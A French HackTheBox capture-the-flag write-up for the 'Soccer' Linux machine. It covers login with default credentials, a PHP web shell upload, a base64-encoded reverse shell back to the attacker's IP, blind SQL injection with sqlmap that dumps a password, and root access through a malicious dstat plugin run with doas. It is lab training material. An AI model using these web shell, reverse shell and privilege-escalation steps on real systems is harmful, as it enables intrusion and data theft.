---
title: HTB | Soccer
description: Soccer is an easy difficulty Linux machine that features a foothold based on default credentials, forfeiting access to a vulnerable version of the Tiny File Manager, which in turn leads to a reverse shell on the target system (CVE-2021-45010). Enumerating the target reveals a subdomain which is vulnerable to a blind SQL injection through websockets. Leveraging the SQLi leads to dumped SSH credentials for the player user, who can run dstat using doas- an alternative to sudo. By creating a custom Python plugin for doas, a shell as root is then spawned through the SUID bit of the doas binary, leading to fully escalated privileges.
slug: soccer-htb
date: 2025-03-12 00:00:00+0000
#image: cover.png
categories:
 - HackTheBox
tags:
 - Linux
 - Easy
#weight: 1
---

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="Soccer cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Soccer</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Linux</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.11.194</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Easy</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## Users
```bash
player : PlayerOftheMatch2022
```

## Enumeration

### nmap
```bash
┌──(kali㉿kali)-[~/htb/Soccer]
└─$ nmap -sC -sV -An -T4 -vvv -p- 10.10.11.194   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-10 18:21 EDT

PORT     STATE SERVICE         REASON  VERSION
22/tcp   open  ssh   syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChXu/2AxokRA9pcTIQx6HKyiO0odku5KmUpklDRNG+9sa6olMd4dSBq1d0rGtsO2rNJRLQUczml6+N5DcCasAZUShDrMnitsRvG54x8GrJyW4nIx4HOfXRTsNqImBadIJtvIww1L7H1DPzMZYJZj/oOwQHXvp85a2hMqMmoqsljtS/jO3tk7NUKA/8D5KuekSmw8m1pPEGybAZxlAYGu3KbasN66jmhf0ReHg3Vjx9e8FbHr3ksc/MimSMfRq0lIo5fJ7QAnbttM5ktuQqzvVjJmZ0+aL7ZeVewTXLmtkOxX9E5ldihtUFj8C6cQroX69LaaN/AXoEZWl/v1LWE5Qo1DEPrv7A6mIVZvWIM8/AqLpP8JWgAQevOtby5mpmhSxYXUgyii5xRAnvDWwkbwxhKcBIzVy4x5TXinVR7FrrwvKmNAG2t4lpDgmryBZ0YSgxgSAcHIBOglugehGZRHJC9C273hs44EToGCrHBY8n2flJe7OgbjEL8Il3SpfUEF0=
|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIy3gWUPD+EqFcmc0ngWeRLfCr68+uiuM59j9zrtLNRcLJSTJmlHUdcq25/esgeZkyQ0mr2RZ5gozpBd5yzpdzk=
|   256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ2Pj1mZ0q8u/E8K49Gezm3jguM3d8VyAYsX0QyaN6H/
80/tcp   open  http  syn-ack nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
9091/tcp open  xmltec-xmlmail? syn-ack
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 139
|     Date: Mon, 10 Mar 2025 22:22:14 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot GET /</pre>
|     </body>
|     </html>
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Mon, 10 Mar 2025 22:22:14 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|_    </html>
```

### gobuster - tiny file manager
```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir --url http://soccer.htb/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt       
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url: http://soccer.htb/
[+] Method:        GET
[+] Threads:       10
[+] Wordlist:      /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:    gobuster/3.6
[+] Timeout:       10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/tiny       (Status: 301) [Size: 178] [--> http://soccer.htb/tiny/]
```
On arrive ensuite sur une page de connexion "Tiny File Manager". Après quelques recherches, on essaye les mots de passes par défaut et on trouve :
```bash
admin : admin@123
```

## Foothold

### Tiny file manager RCE : searchsploit
Avec searchsploit on trouve un RCE authentifié.
```bash
┌──(kali㉿kali)-[~/htb/Soccer]
└─$ searchsploit tiny file manager      
---------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title    |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Manx 1.0.1 - '/admin/tiny_mce/plugins/ajaxfilemanager/ajax_get_file_listing.php' Multiple Cross-Site Scripting Vulnerabilities  | php/webapps/36364.txt
Manx 1.0.1 - '/admin/tiny_mce/plugins/ajaxfilemanager_OLD/ajax_get_file_listing.php' Multiple Cross-Site Scripting Vulnerabilities        | php/webapps/36365.txt
MCFileManager Plugin for TinyMCE 3.2.2.3 - Arbitrary File Upload    | php/webapps/15768.txt
Tiny File Manager 2.4.6 - Remote Code Execution (RCE)     | php/webapps/50828.sh
TinyMCE MCFileManager 2.1.2 - Arbitrary File Upload       | php/webapps/15194.txt
---------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

### RCE exploit
On se connecte les creds par défaut :
- admin : admin@123
On peut uploader facilement un fichier php dans le dossier tiny/uploads sur l'interface d'aministration:
>   <?php system($_GET['cmd']) ?>
Ensuite, on execute un reverse shell. On a mis la commande en base64 pour eviter les bugs avec les caractères spéciaux :
```bash
$ http://soccer.htb/tiny/uploads/a.php?cmd=echo+c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTkvOTAwMSAwPiYx+|+base64+-d+|+bash

----------------------------------

┌──(kali㉿kali)-[~/htb/Soccer]
└─$ nc -lnvp 9001                         
listening on [any] 9001 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.11.194] 34268
sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@soccer:~/html/tiny/uploads$ export TERM=xterm
export TERM=xterm
www-data@soccer:~/html/tiny/uploads$ ^Z
zsh: suspended  nc -lnvp 9001
                                                                                                                                                                                      
┌──(kali㉿kali)-[~/htb/Soccer]
└─$ stty raw -echo; fg
[1]  + continued  nc -lnvp 9001

www-data@soccer:~/html/tiny/uploads$ 
www-data@soccer:~/html/tiny/uploads$ whoami
www-data
www-data@soccer:~/html/tiny/uploads$ cat /home/player/user.txt 
cat: /home/player/user.txt: Permission denied
```

### soc-player.soccer.htb
A l'aide de linpeas, on trouve un autre nom de domaine qui nous donne accès à une nouvelle page.
```bash
www-data@soccer:/tmp$ cat linpeas.out | grep soccer.htb
127.0.0.1       localhost soccer  soccer.htb    soc-player.soccer.htb
    server_name soc-player.soccer.htb;
    return 301 http://soccer.htb$request_uri;
    server_name soccer.htb;
```

### Searching for football tickets
On arrive sur une page web où l'ont peut créer un compte puis se connecter. On a alors accès à une page avec un Ticket id. On peut rechercher si un ticket existe ou non en ecrivant un 'id' de ticket, un nombre entier. Si le site web repond "Ticket exists", alors le ticket existe. Sinon, si on a "Ticket doesn't exist", c'est qu'il n'existe pas. On essaye de tester une injection SQL :
```bash
1 or 1=1; --
```
ça fonctionne! Il nous dit que le ticket est valide ! Alors qu'il est bien invalide normalement. On a donc ce qu'on appelle une Boolean (Blind ?) SQL Injection. C'est à dire qu'il faut faire des requetes à l'aveugle, et selon la réponse, Vrai ou faux, on déduit le nom des tables, colonnes etc.

### Boolean (Blind ?) SQL Injection
```bash
┌──(kali㉿kali)-[~/htb/Soccer]
└─$ sqlmap -u "ws://soc-player.soccer.htb:9091" --threads 10 --data '{"id":"1"}' --batch -D soccer_db -T accounts --dump   
        ___
       __H__                                                                                                                                                                                                                              
 ___ ___[,]_____ ___ ___  {1.8.11#stable}                                                                                                                                                                                                 
|_ -| . [)]     | .'| . |                                                                                                                                                                                                                 
|___|_  [,]_|_|_|__,|  _|                                                                                                                                                                                                                 
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                              

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:14:53 /2025-03-12/

JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[09:14:53] [INFO] resuming back-end DBMS 'mysql' 
[09:14:53] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: JSON id ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"id":"1 AND (SELECT 3147 FROM (SELECT(SLEEP(5)))ioMT)"}

    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: {"id":"-3742 OR 8591=8591"}
---
[09:14:56] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[09:14:56] [INFO] fetching columns for table 'accounts' in database 'soccer_db'
[09:14:56] [INFO] resumed: 4
[09:14:56] [INFO] retrieving the length of query output
[09:14:56] [INFO] resumed: 5
[09:14:56] [INFO] resumed: email
[09:14:56] [INFO] retrieving the length of query output
[09:14:56] [INFO] resumed: 2
[09:14:56] [INFO] resumed: id
[09:14:56] [INFO] retrieving the length of query output
[09:14:56] [INFO] resumed: 8
[09:14:56] [INFO] resumed: password
[09:14:56] [INFO] retrieving the length of query output
[09:14:56] [INFO] resumed: 8
[09:14:56] [INFO] resumed: username
[09:14:56] [INFO] fetching entries for table 'accounts' in database 'soccer_db'
[09:14:56] [INFO] fetching number of entries for table 'accounts' in database 'soccer_db'
[09:14:56] [INFO] retrieved: 1
[09:14:57] [INFO] retrieving the length of query output
[09:14:57] [INFO] retrieved: 17
[09:14:59] [INFO] retrieved: player@player.htb             
[09:14:59] [INFO] retrieving the length of query output
[09:14:59] [INFO] retrieved: 4
[09:15:00] [INFO] retrieved: 1324           
[09:15:00] [INFO] retrieving the length of query output
[09:15:00] [INFO] retrieved: 20
[09:15:02] [INFO] retrieved: PlayerOftheMatch2022             
[09:15:02] [INFO] retrieving the length of query output
[09:15:02] [INFO] retrieved: 6
[09:15:03] [INFO] retrieved: player           
Database: soccer_db
Table: accounts
[1 entry]
+------+-------------------+----------------------+----------+
| id   | email             | password             | username |
+------+-------------------+----------------------+----------+
| 1324 | player@player.htb | PlayerOftheMatch2022 | player   |
+------+-------------------+----------------------+----------+

[09:15:03] [INFO] table 'soccer_db.accounts' dumped to CSV file '/home/kali/.local/share/sqlmap/output/soc-player.soccer.htb/dump/soccer_db/accounts.csv'
[09:15:03] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/soc-player.soccer.htb'

[*] ending @ 09:15:03 /2025-03-12/

```

### SSH connection to "player"
```bash
┌──(kali㉿kali)-[~/htb/Soccer]
└─$ ssh player@soc-player.soccer.htb
The authenticity of host 'soc-player.soccer.htb (10.10.11.194)' can't be established.
ED25519 key fingerprint is SHA256:PxRZkGxbqpmtATcgie2b7E8Sj3pw1L5jMEqe77Ob3FE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'soc-player.soccer.htb' (ED25519) to the list of known hosts.
player@soc-player.soccer.htb's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Mar 12 13:15:53 UTC 2025

  System load:           0.0
  Usage of /:            72.7% of 3.84GB
  Memory usage:          29%
  Swap usage:            0%
  Processes:             244
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.194
  IPv6 address for eth0: dead:beef::250:56ff:fe94:b9b0


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Dec 13 07:29:10 2022 from 10.10.14.19
player@soccer:~$ ls
user.txt
player@soccer:~$ cat user.txt 
5868.....2f04
```

## Privilege Escalation

### SUID Binary : doas
On trouve le binaire SUID "doas" qui semble suspect, grâce à linpeas. En cherchant sur internet, on comprend comment il peut etre exploité. Dans un premier, il faut chercher le fichier de configuration :
```bash
player@soccer:/usr/local/share/dstat$ find / -type f -name "doas.conf" 2>/dev/null
/usr/local/etc/doas.conf
player@soccer:/usr/local/share/dstat$ cat /usr/local/etc/doas.conf 
permit nopass player as root cmd /usr/bin/dstat
```
On remarque que player à le droit d'executé /usr/bin/dstat en tant que root.

Après quelques recherches, on remarque sur linpeas qu'un dossier "/usr/local/share/dstat" est modifiable par root. Or, dstat a une liste de plugins qu'il peut recherche et load depuis certains dossiers, dont notamment celui là. C'est à dire que si on met un plugin dans ce dossier, nous avons un moyen d'executer le code de ce plugin en executant dstat. Nous avon le droit d'executer dstat en tant que root, le plugin va donc etre loadé puis son code executé avec les permissions super utilisateur :
```bash
player@soccer:/usr/local/share/dstat$ echo 'import os; os.execv("/bin/sh", ["sh"])' > ./dstat_xxx.py
player@soccer:/usr/local/share/dstat$ /usr/local/bin/doas /usr/bin/dstat --xxx
/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses
  import imp
## whoami  
root
## cat /root/root.txt
8217.....cc19
```